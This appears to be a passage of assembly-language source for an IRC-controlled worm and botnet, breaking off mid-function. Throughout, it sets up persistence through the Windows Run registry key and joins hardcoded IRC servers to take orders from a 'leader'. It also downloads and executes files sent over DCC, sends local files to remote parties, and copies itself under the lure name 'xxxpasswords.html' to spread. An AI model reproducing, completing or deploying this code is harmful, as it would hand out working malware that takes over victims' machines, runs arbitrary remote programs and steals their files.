        IRCCurrentIp            dd      0


        HostIpAddress           dd      0
        MessageHandler          dd      0

        DownloadedFiles         dd      0

        SendingNick             dd      0
        SendingCommand          dd      0

        scriptExeName           db      "script.exe",0
        ExeAlign                dd      0
        ExeNamePtr              dd      0

        SendVirusName           db      "xxxpasswords.html",0
        DropVirusName           db      "Dllmgr.exe",0

        ThreadSendString        db      400 dup (0)

        SendMyNickInfo          db      "NICK $mynick",0
        SendMyUserInfo          db      "USER $username . . :$realname",0

        DollarReplacements      db      "mynick",0
                                dd      MyNick

                                db      "username",0
                                dd      MyIdent

                                db      "realname",0
                                dd      MyRealName

                                db      "god",0
                                dd      God

                                db      "leader",0
                                dd      Leader

                                db      "slaves",0
                                dd      Slaves

                                db      "slave1",0
                                dd      Slave1

                                db      "slave2",0
                                dd      Slave2

                                db      "slave3",0
                                dd      Slave3 

                                db      "slave4",0
                                dd      Slave4

                                db      "slave5",0
                                dd      Slave5

                                db      "nick",0
                                dd      SendingNick

                                db      "recv",0
                                dd      RecvPtr

                                db      "path",0
                                dd      PathPtr

                                db      0


        StackUsed       equ     4000

Functionlist    dd      0
                dd      RestartAllFuckingThings

                dd      DCCRecvFunction
                dd      DCCRecvFunction  ; chat

                dd      DCCSendFunction
                dd      QuitFunction

                dd      NewSlaveFunction
                dd      ShouldRecieveProgram
                dd      GenerateNewNick
        
                dd      ExecuteProgram
                dd      DirFunction


        RecvPtr         dd      RecvString
        PathPtr         dd      PathString
; Strings
        db      0
        PRIVMSGNick             db      "PRIVMSG $recv :",0
        NoPlaceString           db      "PRIVMSG $recv :No, ask $slave1",0
        ERR_PARSE               db      "Error parsing message!",0
        NickStr                 db      "$nick",0
        YouGotFileStr           db      "SEND:",0
        GetFileString           db      "PRIVMSG $recv :DCC $3",0
        Worked                  db      "Worked",0
        NickCommand             db      "NICK 1234567890",0
        RecvString              db      300 dup (0)
        PathString              db      "c:\windows\system"
                                db      260 dup (0)

        ErrorStr                db      "Error",0,0,0,0,0,0,0

        RegSubKey               db      "Software\Microsoft\Windows\CurrentVersion\Run",0

        RegName                 db      "Teddybear",0







.code


; This scriptfile is used to recieve a more advanced (and bigger) scriptfile
; If there already exist a scriptfile then this isnt used

        NULL                    equ     0
        EndOfList               equ     0

        NoScan                  equ     1

        s_ScriptSize            equ     s_End-s_Header
        s_ConnectFunction       equ     1
        s_DCCRecvFunction       equ     2
        s_DCCChatFunction       equ     3

        s_DCCSendFunction       equ     4

        s_QuitFunction          equ     5
        s_NewSlaveFunctions     equ     6
        s_ShouldRecieveProgram  equ     7

   s_Header:
        s_Magic                 db      "VIRc"
        s_Alignment             dd      -401000h

        s_User                  dd      s_Userinfo
        s_Slaves                dd      s_SlaveNames
        s_Ignores               dd      s_IgnoreNames
        s_IRCServers            dd      s_IPList

        s_MessageParsePtr       dd      s_MessageParseData

        s_DownloadedFiles       dd      s_ListOfDownloadedFiles

   s_EndOfHeader:

; ---------------------------------------------- User info

   s_Userinfo:
        s_Nickname              db      10 dup (0)
        s_Ident                 db      "Nick"
        db      10-($-s_Ident)    dup (0)
        s_RealName              db      "DrSolomon"
        db      10-($-s_RealName) dup (0)
        s_God                   db      "VirusGod"
        db      10-($-s_God)      dup (0)
        s_Leader                db      "VirusGod"
        db      10-($-s_Leader)   dup (0)
   s_SlaveNames:
   s_IgnoreNames:
                                db      EndOfList

; ----------- List of IP addresses of undernet IRC servers

  s_IPList                      db      "192.160.127.97",0
                                db      "130.243.35.1",0   ; efnet
                                db      "203.37.45.2",0
                                db      "209.47.75.34",0
                                db      "195.154.203.241",0
                                db      "194.159.80.19",0
                                db      "128.138.129.31",0
                                db      EndOfList

; -------------- How to handle messages

  s_MessageParseData:
                                db      NoScan
                                db      "|$0 ",2
                                dd      s_RealStart
                                db      EndOfList

  s_RealStart:
                                db      "$0 PRIVMSG",0
                                db      "|$1 ",2; split $1 at space until 
                                                ; two new strings is created
                                dd      s_PrivMsgData

                                db      "$0 001",0 ; First message
                                db      "l"
                                dd      s_StartCommands

                                db      "$0 303",0
                                db      "l"
                                dd      s_IsOnMessage


; Low level commands
                                db      "$0 PING",0
                                db      "s"
                                db      "PONG $1",0

                                db      "$0 433",0
                                db      "f"
                                dw      8       ;GenerateNewNick

                                db      "$0 ERROR",0
                                db      "f"
                                dw      s_ConnectFunction

                                db      EndOfList

; ------------------------------------ Handler of PRIVMSGs

  s_PrivMsgData:

                db      "$nick $leader",0       ; messages from the leader
                db      "l"
                dd      s_LeaderMessages


                db      EndOfList

  s_LeaderMessages:
                db      "$2 ",01,"DCC",0        ; leader sends a file
                db      "|$2 ",3                ; $3 = send or chat
                dd      s_DCCRecvProc           ; $4 = additional data

                db      "$2 :Hello child",0
                db      "s"
                db      "$0 $leader :DCC script.exe",0

                db      EndOfList

; -------------------------------------------- DCC Handler
  s_DCCRecvProc:
			db	"$3 SEND",0
			db	"f"
                        dw      s_DCCRecvFunction

                        db      NoScan
                        db      "f"
                        dw      s_QuitFunction

			db	EndOfList

; ------------------------------------ If leader is online
  s_IsOnMessage:
                                db      "$1 $leader",0
                                db      "s"
                                db      "PRIVMSG $leader :Hello master",0

                                db      "!$1 $leader",0
                                db      "l"
                                dd      s_Restart
                                db      EndOfList       
                        
  s_Restart:                    ; new leader is god
                                db      NoScan
                                db      "v"
                                db      "$leader $god",0

                                ; restart virus
; ----------------------- Commands to send when registered

  s_StartCommands:              ; Check if leader is online, if virus = god
                                ; then its not nessesary

                                db      "!$mynick $god",0
                                db      "s"
                                db      "ISON $leader",0
                                db      EndOfList

s_ListOfDownloadedFiles:
                                db      EndOfList

s_End:


StartIrcBot:

Random proc RndMax:dword
        local   time:SYSTEMTIME
        push    ebx
        push    edx
        mov     eax,RndMax
        inc     eax
        mov     ebx,eax

        lea     eax,time
        invoke  GetLocalTime, eax

        mov     ax,time.wMilliseconds
        shl     eax,16
        mov     ax,time.wSecond

        rol     ax,8
        or      ax,time.wMinute
        rol     ax,16
        or      ax,time.wHour

        add     eax,RandomNumber
        rol     eax,cl
        add     eax,14
        xor     ecx,46
        ror     eax,cl
        add     RandomNumber,eax        

        cmp     ebx,0
        jz      NoMod
        xor     edx,edx
        div     ebx
        xchg    eax,edx
     NoMod:
        pop     edx
        pop     ebx
        ret
Random endp        


UpdateScriptFile:
        push    ebx
        lea     eax,DataFilename
        mov     ebx,GENERIC_WRITE
        mov     ecx,CREATE_ALWAYS
        call    MyOpenFile
        jz      Error



        push    eax
        invoke  WriteFile, eax, ScriptInMem, ScriptFileSize, offset Temp, 0

        call    CloseHandle
        pop     ebx
        ret


GetIpFunction:
        push    edi
        invoke  LocalAlloc, LMEM_ZEROINIT, 1000
        mov     edi, eax
        invoke  gethostname, edi, 950
        invoke  gethostbyname, edi

        test    eax,eax
        jz      Return   

        mov     ecx,[eax+3*4]
        mov     ecx,[ecx]
        mov     ecx,[ecx]
        invoke  htonl, ecx

        mov     HostIpAddress, eax
        invoke  LocalFree, edi
        
        pop     edi
       Return:
        ret

QuitFunction:

        jmp     Error

StringCmp:
        push    esi
        push    edi
        invoke  lstrlen,esi
        mov     Temp,eax
        invoke  lstrlen,edi
        cmp     eax,Temp
        jnz     NotEqualStrings
        mov     ecx,eax

        repz    cmpsb

   NotEqualStrings:
        pop     edi
        pop     esi
        ret

MyOpenFile:
        xor     edx,edx
        invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
        mov     ebx,eax
        cmp     eax,INVALID_HANDLE_VALUE
        
        ret


AsciiToNum proc NumString:dword

        push    esi
        mov     esi,NumString

        xor     ecx,ecx

     CheckNextChar:
        lodsb
        cmp     al,'0'
        jl      NoMore
        cmp     al,'9'
        ja      NoMore
        inc     ecx
        jmp     CheckNextChar

    NoMore:
        mov     esi,NumString

        xor     eax,eax
        xor     edx,edx

     CreateNumber:
        imul    edx,edx,10
        lodsb
        sub     eax,'0'
        add     edx,eax
        loop    CreateNumber

        pop     esi
        mov     eax,edx
        ret


AsciiToNum endp










lstrlenInc proc String:dword
        invoke  lstrlen, String
        inc     eax
        ret
lstrlenInc endp


LoadSlaveData proc SlavePtr
        push    ebx
        push    edi

        mov     eax,SlavePtr
        mov     ebx,Slaves

        lea     edi,Slave1
        mov     ecx,NumSlaves
     CopySlaveNames:
        push    eax
        push    ecx

        invoke  lstrcpy, ebx, eax
        invoke  lstrlen, ebx
        pop     ecx


        test    eax,eax
        jz      NoComma

        add     ebx,eax
        mov     byte ptr [ebx],','
        inc     ebx
     NoComma:
        pop     eax

        stosd
        add     eax,10
        loop    CopySlaveNames

        .if ebx!=Slaves
        dec     ebx
        mov     byte ptr [ebx],cl
        .endif

        pop     edi
        pop     ebx
        ret
LoadSlaveData endp


SetupProgram proc uses ebx edi esi
        local   FileHandle:dword
        xor     esi, esi

        invoke  RegCreateKey, HKEY_LOCAL_MACHINE, offset RegSubKey, offset hKey
        test    eax,eax
        jnz     Error

        invoke  LocalAlloc, LMEM_ZEROINIT, 600
        mov     ebx, eax
        lea     edi, [eax+300]

        invoke  GetCurrentDirectory, 300, ebx
        invoke  GetSystemDirectory, edi, 300
        invoke  SetCurrentDirectory, edi

        mov     eax,"NIW\"
        cmp     [ebx+2],eax
        jnz     FinishedEditScriptExe

        invoke  GetModuleFileName, esi, ebx, 300

        invoke  RegSetValueEx, hKey, offset RegName, esi, REG_SZ, ebx, eax


        invoke  LocalFree, ebx
        invoke  RegCloseKey, hKey

        sub     esp,1000h
        mov     eax,esp
        INVOKE  WSAStartup, 1h, eax
        add     esp,1000h


        lea     eax,DebugFilename
        mov     ebx,GENERIC_WRITE
        mov     ecx,CREATE_ALWAYS
        invoke  CreateFileA, eax, ebx, 1, esi, ecx, esi, esi
        mov     DebugFilePtr, eax

        lea     eax,DataFilename
        mov     ebx,GENERIC_READ
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      OpenInternScriptFile


        mov     DataFilePtr, eax
        invoke  GetFileSize, eax, 0

        mov     ScriptFileSize,eax

        mov     edi, eax
        lea     eax,[eax+5000]

        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     StrBuffert,eax

        add     eax,3000
        mov     ScriptInMem,eax
        mov     esi,eax                         ; esi -> IRC data header
        invoke  ReadFile, DataFilePtr, eax, edi, offset Temp, 0

        invoke  CloseHandle, DataFilePtr
        jmp     ReadScriptFile

OpenInternScriptFile:
        mov     esi,offset s_Header
        mov     eax,s_ScriptSize
        mov     ScriptFileSize,eax
        add     eax,3000

        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     StrBuffert, eax
        add     eax,3000
        mov     edi, eax
        mov     ScriptInMem, eax
        mov     ecx,s_ScriptSize
        rep     movsb
        mov     esi,eax

   ReadScriptFile:

        lodsd                                   ; Magic
        cmp     eax,Magic
        jnz     Error

        lodsd                                   ; aligment
        add     eax,esi
        lea     ebx,[eax-8]
        mov     Aligment,ebx

        lodsd                                   ; pointer to Userinfo
        lea     edi,[eax+ebx]

        push    ebx
        lea     ebx,MyNick

     CopyUserData:
        mov     [ebx], edi
        add     ebx,4
        add     edi,10
        cmp     byte ptr [edi],0
        jnz     CopyUserData
        pop     ebx

        invoke  LocalAlloc, LMEM_ZEROINIT, 10*NumSlaves
        mov     Slaves,eax

        lodsd                                   ; slave names
        add     eax,ebx

        invoke  LoadSlaveData, eax

        lodsd                                   ; Ignore names
        add     eax,ebx
        mov     IgnoreNicks,eax



        lodsd                                   ; IRC server list
        add     eax,ebx
        mov     IRCIpNumbers,eax
        mov     IRCCurrentIp,eax

        lodsd                                   ; Message Handler
        add     eax,ebx
        mov     MessageHandler,eax

        lodsd                                   ; Downloaded files ptr
        add     eax,ebx
        mov     DownloadedFiles, eax

        mov     esi,eax
        mov     edi,eax


   CheckNextFilename:
        mov     eax,esi
        mov     ebx,0
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      FileDidntExist

        invoke  CloseHandle, eax

        invoke  lstrcpy, edi, esi
        invoke  lstrlenInc, esi
        add     edi, eax

    FileDidntExist:
        invoke  lstrlenInc, esi
        dec     eax
        jz      NoIncrease
        inc     eax

     NoIncrease:
        add     esi,eax
        cmp     byte ptr [esi],0
        jnz     CheckNextFilename

        mov     byte ptr [edi],0
        sub     esi, edi

        sub     ScriptFileSize, esi

        call    UpdateScriptFile

        invoke  LocalAlloc, LMEM_ZEROINIT, 3000
        mov     BuffertPtr,eax
        mov     InBuffertPtr,eax

        invoke  LocalAlloc, LMEM_ZEROINIT, 1000
        mov     TemporaryBuffert,eax

        mov     esi,DownloadedFiles

    RunNextProgram:
        invoke  WinExec, esi, SW_SHOW
        invoke  lstrlen, esi
        test    eax,eax
        jz      NoMoreFilesToRun

        inc     eax
        add     esi, eax
        jmp     RunNextProgram

    NoMoreFilesToRun:

        mov     eax,offset scriptExeName
        mov     ebx,GENERIC_WRITE+GENERIC_WRITE
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      FinishedEditScriptExe

        xor     esi, esi
        invoke  SetFilePointer, ebx, 200h+4, esi, esi

        invoke  ReadFile, ebx, offset ExeAlign, 8, offset Temp, esi
        mov     edi,ExeNamePtr
        sub     edi,ExeAlign
        add     edi,200+40

        invoke  Random, 20
        test    eax,eax
        jnz     SetNewLeader

        sub     edi, 10                         ; change god instead
        
     SetNewLeader:
        invoke  SetFilePointer, ebx, eax, esi, esi

        invoke  WriteFile, ebx, MyNick, 10, offset Temp, esi
        invoke  CloseHandle, ebx

    FinishedEditScriptExe:

        xor     esi,esi

        mov     eax,Offset SendVirusName
        mov     ebx,GENERIC_WRITE
        mov     ecx,CREATE_ALWAYS
        call    MyOpenFile
        jz      DroppedNewVirus

        mov     FileHandle, ebx

        invoke  LocalAlloc, LMEM_ZEROINIT, 300
        mov     edi, eax

        invoke  GetModuleFileName, esi, edi, 300

        invoke  CreateFileA, edi, GENERIC_READ, 1, esi, OPEN_EXISTING, esi, esi
        mov     ebx, eax
        inc     eax
        jz      Error

        invoke  LocalFree, edi

        invoke  CreateFileMappingA, ebx, esi, PAGE_WRITECOPY, esi, esi, esi
        mov     edi, eax
        test    eax,eax
        jz      Error

        invoke  MapViewOfFile, edi, FILE_MAP_COPY, esi, esi, esi
        test    eax,eax
        jz      Error

        
        xchg    esi, eax
        pushad
        invoke  GetFileSize, ebx, eax
        mov     edi, eax

        mov     eax, offset DropVirusName
        mov     ebx, GENERIC_WRITE
        mov     ecx, CREATE_NEW
        call    MyOpenFile
        jz      DontDropFile

        invoke  WriteFile, ebx, esi, edi, offset Temp, 0
        invoke  CloseHandle, ebx

        invoke  WinExec, offset DropVirusName, SW_SHOW
        jmp     Error

   DontDropFile:

        lea     edi, [esi+((s_Userinfo+40)-s_Header+400h)]
        invoke  Random, 20
        test    eax,eax
        jnz     ChangeLeader
        sub     edi, 10

   ChangeLeader:
        mov     esi, MyNick
        test    esi, esi
        jz      Error
        mov     ecx, 10
        rep     movsb

        popad
        invoke  GetFileSize, ebx, eax

        invoke  WriteFile, FileHandle, esi, eax, offset Temp, 0

        invoke  UnmapViewOfFile, esi

        invoke  CloseHandle, edi
        invoke  CloseHandle, ebx

        invoke  CloseHandle, FileHandle

  DroppedNewVirus:


        mov     eax,MyNick
        mov     eax,[eax]
        test    eax,eax
        jnz     DontNeedToGenerateNewNick

        call    GenerateNewNick

  DontNeedToGenerateNewNick:  
        ret
SetupProgram endp


        



FindReplacement proc DollarCommand:dword
        push    esi
        push    edi

        mov     esi,DollarCommand

        mov     edx,TemporaryBuffert
        mov     edi,edx
        xor     eax,eax

        lodsb
        cmp     al,'$'
        jnz     Error

        lodsb

        .if al>='0' && al<='9'
                sub     al,'0'
                lea     eax,[Buffs+eax*4]
                push    2


        .else
                push    edx
            GetStringToDisplace:
                push    eax
                invoke  IsCharAlphaNumeric, eax
                test    eax,eax
                pop     eax
                jz      SeekForDisplacement
                stosb
                lodsb
                jmp     GetStringToDisplace

            SeekForDisplacement:
                pop     edx
                xor     eax,eax
                stosb
                sub     esi,DollarCommand
                dec     esi
                push    esi

                mov     edi,edx                 ; edi -> $ string
                lea     esi,DollarReplacements  ; esi -> list of $ strings

            SeekForReplacement:
                invoke  lstrlenInc,esi
                push    eax
                call    StringCmp
                pop     eax
                jz      FoundString

            DidntFind:
                lea     esi,[esi+eax+4]
                cmp     byte ptr [esi],0
                jnz     SeekForReplacement

                mov     eax,DollarCommand
                jmp     ReturnFindReplacement

          FoundString:
                mov     eax,[esi+eax]           ; esi -> -> String
        .endif

    ReturnFindReplacement:
    ReturnNoDollar:
        push    eax
        mov     eax,[eax]                       ; eax -> String

        invoke  lstrcpy, TemporaryBuffert, eax
        pop     edx                             ; ptr to ptr to string
        pop     ecx                             ; length of $ command
        pop     edi
        pop     esi
        ret
FindReplacement endp




; sets carry flag if not found
IsInMessage proc StringToSearchIn:dword, SearchString:dword
        push    edi                             ; save registers
        push    esi                             ; ebx, esi, edi should never
                                                ; be changed in a function

        invoke  lstrlen,SearchString

        mov     edi,eax

        invoke  lstrlen,StringToSearchIn

        sub     eax,edi
        jc      NotFound

        inc     eax
        mov     edx,edi
        mov     esi,StringToSearchIn
        mov     edi,SearchString

      ScanLoop:
        push    esi
        push    edi
        mov     ecx,edx
        repz    cmpsb
        pop     edi
        pop     esi
        jz      FoundString

        inc     esi
        dec     eax
        jz      NotFound                        ; jnz ScanLoop, but faster
        jmp     ScanLoop                        ; on pentiums

     NotFound:
        pop     esi
        pop     edi
        mov     eax,StringToSearchIn
        stc
        ret

     FoundString:
        mov     eax,esi
        pop     esi
        pop     edi
        clc
        ret
IsInMessage endp


SplitStringAtSpace proc Message:dword
        invoke  IsInMessage, Message, offset Space
        jb      NoSpaceInString

        mov     byte ptr [eax],0
        inc     eax
    NoSpaceInString:
        ret
SplitStringAtSpace endp


CreateString proc ToString:dword, FromString:dword
        push    esi
        push    edi
        mov     esi,FromString
        mov     edi,ToString

     CreateStringLoop:
        xor     eax,eax
        lodsb

        .if eax=="$"
                dec     esi
                invoke  FindReplacement, esi
                add     esi,ecx                 ; string length returned in
                                                ; ecx, wont work in HLL

                push    eax                     ; copy from
                invoke  lstrlen,eax
                inc     eax
                
                push    edi                     ; copy to
                add     edi,eax

                call    lstrcpy
                dec     edi

        .elseif eax!=0
                stosb
        .else
                jmp     StringCreated
        .endif
        jmp     CreateStringLoop
     
     StringCreated:
        mov     eax,edi
        pop     edi
        pop     esi
        ret
CreateString endp


SendMsg proc Message:dword
        push    esi
        push    edi

        mov     eax,1000
        invoke  LocalAlloc, LMEM_ZEROINIT, eax

        mov     edi,eax
        mov     esi,Message

        invoke  CreateString, edi, esi

        mov     word ptr [eax],CRLF        
        sub     eax,edi
        lea     esi,[eax+2]

        push    0
        mov     edx,esp
        invoke  WriteFile, DebugFilePtr, edi, esi, edx, 0  ; for debugging
        pop     ecx

        invoke  send, SocketPtr, edi, esi, 0    ; send string to irc server
        invoke  LocalFree, edi                  
        
        pop     edi
        pop     esi
        ret
SendMsg endp

GetMsg proc WriteBuffert:dword
GetMsgStart:
        invoke  IsInMessage, InBuffertPtr, offset LF
        jnc     EnoughData

        invoke  lstrlen, InBuffertPtr
        push    esi
        mov     esi,eax
        inc     eax
        invoke  lstrcpyn, BuffertPtr, InBuffertPtr, eax

        add     eax,esi                         ; eax -> Zerospace
        mov     ebx,498
        sub     ebx,esi                         ; how much to read
        pop     esi

        push    eax
        invoke  recv, SocketPtr, eax, ebx, 0

        test    eax,eax
        jz      Error
        cmp     eax,-1
        jz      Error

        pop     ecx
        add     eax,ecx

        push    BuffertPtr
        pop     InBuffertPtr
        mov     byte ptr [eax],0

        jmp     GetMsgStart

    EnoughData:
; debug code
        pushad
        sub     eax,InBuffertPtr
        inc     eax

        push    0
        mov     edx,esp
        invoke  WriteFile, DebugFilePtr, InBuffertPtr, eax, edx, 0
        pop     edx
        popad

        mov     byte ptr [eax],0

        inc     eax
        xchg    eax,InBuffertPtr

        invoke  lstrcpy, WriteBuffert, eax

        lea     eax,CR                          ; delete CR
        invoke  IsInMessage, WriteBuffert, eax
        jc      GetMsgReturn
        mov     byte ptr [eax],0

     GetMsgReturn: 
        invoke  lstrlen, WriteBuffert

        mov     ecx,WriteBuffert
        xor     edx,edx
        mov     [ecx+eax],edx

        push    ebx
        lea     ebx, ThreadSendString
        mov     eax,dword ptr [ebx]
        test    eax,eax
        jz      NoThreadInfoToSend
        
        invoke  SendMsg, ebx
        xor     eax,eax
        mov     [ebx],eax

   NoThreadInfoToSend:
        pop     ebx
        ret


GetMsg endp


NumToAscii proc Buffert:dword, Number:dword
        push    edi
        push    esi
        push    ebx
        invoke  LocalAlloc, LMEM_ZEROINIT, 20
        mov     ebx,eax
        lea     esi,[eax+19]

        mov     eax,Number
        mov     ecx,10

     StringCreateLoop:
        xor     edx,edx
        div     ecx
        add     edx,'0'
        dec     esi
        mov     byte ptr [esi],dl
        test    eax,eax
        jnz     StringCreateLoop

        mov     edi,Buffert
        invoke  lstrlen, esi
        mov     ecx,eax
        rep     movsb
        invoke  LocalFree, ebx

        pop     ebx        
        pop     esi
        pop     edi
        ret
NumToAscii endp

ExecuteProgram:
        mov     eax,[Buffs+3*4]
        invoke  WinExec, eax, SW_SHOW
        ret

DCCSendMessage  db      "PRIVMSG $nick :",01,"DCC SEND $3",0
SendInAscii     db      "SEND",0

DCCSendSpaceSaver:
        invoke  lstrlen, edi
        add     edi, eax
        mov     al,' '
        stosb
        ret

DCCSend proc SendString:dword
        local   DCCConnection:sockaddr_in
        local   SockAddrTemp:sockaddr_in
        local   DCCSocket:dword
        local   FilePtr:dword
        local   ByteRead:dword
        local   DCCTemp:dword
        local   FileName:dword
        local   DCCMemPtr:dword
        local   BytesRead:dword
        local   Port:dword


        local   TimeOut:timeval
        local   readfds:fd_set

        xor     esi, esi

        invoke  IsInMessage, SendString, offset SendInAscii
        invoke  IsInMessage, eax, offset Space  
        inc     eax
        mov     FileName, eax

        invoke  CreateFileA, eax, GENERIC_READ, FILE_SHARE_READ, esi, OPEN_EXISTING, esi, esi
        mov     ebx,eax
        inc     eax
        jz      FileNotFound
        mov     FilePtr, ebx

        invoke  GetFileSize, ebx, esi
        mov     ByteRead, eax

        invoke  socket, AF_INET, SOCK_STREAM, esi
        mov     DCCSocket, eax

        mov     DCCConnection.sin_family, AF_INET

        lea     edi,DCCConnection.sin_zero
        xor     eax,eax
        stosd
        stosd


        invoke  Random, 2000
        add     eax,50200
        mov     Port,eax
        push    eax
        call    htons
        mov     DCCConnection.sin_port,ax

        xor     eax,eax
        mov     DCCConnection.sin_addr,eax

        lea     eax,DCCConnection
        invoke  bind, DCCSocket, eax, sizeof(sockaddr_in)
        test    eax,eax
        jnz     ErrorDCCSend
        

        mov     edi,SendString
        call    DCCSendSpaceSaver

        invoke  NumToAscii, edi, HostIpAddress
        call    DCCSendSpaceSaver

        invoke  NumToAscii, edi, Port
        call    DCCSendSpaceSaver

        mov     eax,ByteRead
        invoke  NumToAscii, edi, eax
        invoke  lstrlen,edi
        add     edi, eax

        xor     eax,eax
        inc     eax
        stosb

        lea     ebx, ThreadSendString
   WaitUntilMessageQueueIsCleared:
        invoke  Sleep, 100
        mov     eax,[ebx]
        test    eax,eax
        jnz     WaitUntilMessageQueueIsCleared

        invoke  lstrcpy, offset ThreadSendString, SendString ; let the main
                                                ; thread send the message

        invoke  listen, DCCSocket, 2

        lea     ebx,readfds
        assume  ebx:ptr fd_set
        inc     esi
        mov     [ebx].fd_count, esi
        dec     esi

        mov     eax,DCCSocket
        mov     [ebx].fd_array, eax

        assume  ebx:nothing

        lea     eax,TimeOut
        assume  eax:ptr timeval
        mov     [eax].tv_sec, 50
        mov     [eax].tv_usec, esi
        assume  eax:nothing

        invoke  select, ecx, ebx, esi, esi, eax
        test    eax,eax
        jz      ErrorDCCSend

        invoke  accept, DCCSocket, esi, esi

        xchg    eax,DCCSocket
        invoke  closesocket, eax

        mov     esi,1000
        sub     esp,esi
        mov     ebx,esp

     SendLoop:
        lea     edi,BytesRead
        invoke  ReadFile, FilePtr, ebx, esi, edi, 0

        invoke  send, DCCSocket, ebx, [edi], 0

        cmp     [edi],esi
        jz      SendLoop
        add     esp,esi

        invoke  Sleep, 5000

     ErrorDCCSend:
        invoke  closesocket, DCCSocket
        invoke  CloseHandle, FilePtr

     FileNotFound:
        invoke  LocalFree, SendString
        ret

DCCSend endp

DCCSendFunction proc
        push    edi

        invoke  LocalAlloc, LMEM_ZEROINIT, 2000

        mov     edi,eax

        invoke  CreateString, edi, offset DCCSendMessage

        invoke  CreateThread, 0, StackUsed, offset DCCSend, edi, 0, offset Temp
        pop     edi
        ret
DCCSendFunction endp


GenerateNewNick:
        pushad

        mov     edi,MyNick
        invoke  Random, 4

        lea     ebx,[eax+4]                     ; how many chars (4-8)

        invoke  Random, 'Z'-'A'
        add     eax,'A'
        stosb                                   ; store character

    CreateNickLoop:
        invoke  Random, 'z'-'a'
        add     eax,'a'
        stosb
        dec     ebx
        jnz     CreateNickLoop

        xor     eax,eax
        stosb

        call    UpdateScriptFile

        lea     eax,[NickCommand+5]
        invoke  lstrcpy, eax, MyNick

        invoke  SendMsg, offset NickCommand

        popad
        ret

DCCRecv proc DCCMessage:dword
        local   DCCConnection:sockaddr_in
        local   DCCSocket:dword
        local   DCCFileptr:dword
        local   DCCTemp:dword
        local   DCCFilename:dword


        invoke  socket, AF_INET, SOCK_STREAM, 0
        mov     DCCSocket, eax

        mov     DCCConnection.sin_family, AF_INET

        mov     esi, DCCMessage

        invoke  SplitStringAtSpace, esi         ; eax -> ip

        mov     esi,eax
        mov     edi,eax

        invoke  lstrlen, DCCMessage
        add     eax,50
        invoke  LocalAlloc, LMEM_ZEROINIT, eax
        mov     DCCFilename, eax
        invoke  lstrcpy, eax, DCCMessage

        mov     eax,DCCMessage
        mov     ebx,GENERIC_READ or GENERIC_WRITE
        mov     ecx,OPEN_EXISTING
        call    MyOpenFile
        jz      ErrorRecieving

        mov     DCCFileptr,eax

        invoke  SplitStringAtSpace, esi         ; eax -> port
        mov     esi,eax

        invoke  AsciiToNum, edi
        invoke  htonl, eax
        mov     DCCConnection.sin_addr,eax

        mov     edi,esi
        invoke  SplitStringAtSpace, esi         ; eax -> size

        invoke  AsciiToNum, eax        
        mov     ebx,eax

        invoke  AsciiToNum, edi
        push    eax
        call    htons
        mov     DCCConnection.sin_port,ax

        lea     edi,DCCConnection.sin_zero
        xor     eax,eax
        stosd
        stosd

        lea     eax,DCCConnection
        invoke  connect, DCCSocket, eax, sizeof(sockaddr_in)
        cmp     eax,SOCKET_ERROR
        jz      FileRecieved
        xor     esi, esi

    RecieveFileLoop:
        invoke  recv, DCCSocket, DCCMessage, 1000, 0 ; copy data to buffert
        inc     eax
        jz      ErrorRecieving
        dec     eax

        sub     ebx,eax                         ; ebx = how much more data
        add     esi, eax

        lea     ecx,DCCTemp
        xor     edx,edx
        mov     [ecx],edx
        invoke  WriteFile, DCCFileptr, DCCMessage, eax, ecx, 0

        invoke  htonl, esi
        mov     DCCTemp, eax
        lea     eax,DCCTemp

        invoke  send, DCCSocket, eax, 4, 0

        test    ebx,ebx
        jnz     RecieveFileLoop


FileRecieved:
        invoke  closesocket, DCCSocket
        invoke  CloseHandle, DCCFileptr
        invoke  LocalFree, DCCMessage

        invoke  WinExec, DCCFilename, SW_SHOW
        
        mov     esi,DownloadedFiles

      GetEndOfFileList:
        invoke  lstrlenInc, esi
        dec     eax
        jz      NoChangeBack
        inc     eax
     NoChangeBack:
        add     esi, eax
        cmp     byte ptr [esi],0
        jnz     GetEndOfFileList

        invoke  lstrcpy, esi, DCCFilename

        invoke  lstrlenInc, esi
        add     ScriptFileSize, eax

        call    UpdateScriptFile

        invoke  LocalFree, DCCFilename

        ret
        
ErrorRecieving:        
        invoke  LocalFree, DCCFilename
        invoke  closesocket, DCCSocket
        invoke  CloseHandle, DCCFileptr
        invoke  LocalFree, DCCMessage
        ret

DCCRecv endp


DCCRecvFunction:
        push    esi

        invoke  LocalAlloc, LMEM_ZEROINIT, 2000
        mov     esi,eax

        invoke  lstrlen,[Buffs+4*4]
        invoke  lstrcpyn, esi, [Buffs+4*4], eax

        invoke  SplitStringAtSpace, esi

        mov     eax,esi
        mov     ebx,GENERIC_READ
        mov     ecx,CREATE_ALWAYS
        nop
        call    MyOpenFile
        jz      ErrorDCCRecv

        invoke  CloseHandle, eax

        invoke  lstrlen,[Buffs+4*4]
        invoke  lstrcpyn, esi, [Buffs+4*4], eax

        lea     eax,DCCRecv
        invoke  CreateThread, 0, StackUsed, eax, esi, 0, offset Temp
        pop     esi
        ret

   ErrorDCCRecv:
        invoke  LocalFree, esi
        pop     esi
        ret

ShouldRecieveProgram:
        invoke  CreateFile, [Buffs+3*4], 0, 0, 0, OPEN_EXISTING, 0, 0
        cmp     eax,INVALID_HANDLE_VALUE
        jnz     DontDownloadFile

        invoke  SendMsg, offset GetFileString
        ret

   DontDownloadFile:
        invoke  CloseHandle, eax
        ret


NewSlaveFunction:
        mov     ecx,NumSlaves
        mov     edx,Slaves
        mov     eax,Slave1

    LookForFreeSlaveSlot:
        cmp     byte ptr [eax],0
        jz      AddNewSlave

        add     eax,10
        dec     ecx
        jnz     LookForFreeSlaveSlot

        invoke  Random, 5
        add     eax,'1'
        mov     [NoPlaceString+26],al

        invoke  SendMsg, offset NoPlaceString

        ret


DirMessage      db      "PRIVMSG Bhunji :$3",0
DirFile         db      "dirfile.txt",0

DirFunction proc
        local   FindData:WIN32_FIND_DATA
        local   FileHandle:dword

        lea     edi,FindData
        assume  edi:ptr WIN32_FIND_DATA

        mov     eax,offset DirFile
        mov     ebx,GENERIC_WRITE
        mov     ecx,CREATE_ALWAYS
        call    MyOpenFile
        jz      ErrorDirFunction

        mov     FileHandle, ebx

